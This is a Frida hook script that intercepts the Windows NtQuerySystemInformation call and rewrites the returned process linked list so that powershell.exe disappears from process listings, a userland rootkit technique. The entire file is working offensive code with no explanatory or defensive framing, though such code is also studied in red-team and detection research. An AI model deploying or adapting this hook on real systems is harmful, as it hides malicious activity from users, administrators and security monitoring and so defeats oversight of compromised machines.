{
	onEnter: function (log, args, state) {
    if (args[0] == 5) {
        log("NtQuerySystemInformation:");
        log("  --> Class : " + args[0] + " [SystemProcessInformation]");
        log("  --> Addr  : " + args[1]);
        log("  --> len   : " + args[2]);
        log("  --> Retlen: " + Memory.readInt(args[3]) + "\n");
         
        this.IsProcInfo = 1;
        this.Address = args[1];
    }
},
 
onLeave: function (log, retval, state) {
    if (this.IsProcInfo) {
        while (true) {
            // Get struct offsets
            var ImageOffset = ptr(this.Address).add(64); // ImageName->UNICODE_STRING->Buffer
            var ImageName = Memory.readPointer(ImageOffset); // Cast as ptr
            var ProcID = ptr(this.Address).add(80); // PID
             
            // If PowerShell, rewrite the linked list
            if (Memory.readUtf16String(ImageName) == "powershell.exe") {
                log("[!] Hooking to hide PowerShell..");
                log("  --> Rewriting linked list\n");
                this.PreviousStruct = ptr(this.Address).sub(NextEntryOffset);
                Memory.writeInt(this.PreviousStruct, (Memory.readInt(this.PreviousStruct)+Memory.readInt(this.Address)))
            }
     
            // Move pointer to next struct
            var NextEntryOffset = Memory.readInt(this.Address);
            this.Address = ptr(this.Address).add(NextEntryOffset);
            if (NextEntryOffset == 0) { // The last struct has a NextEntryOffset of 0
                break
            }
        }
         
        // Null
        this.IsProcInfo = 0;
    }
}
}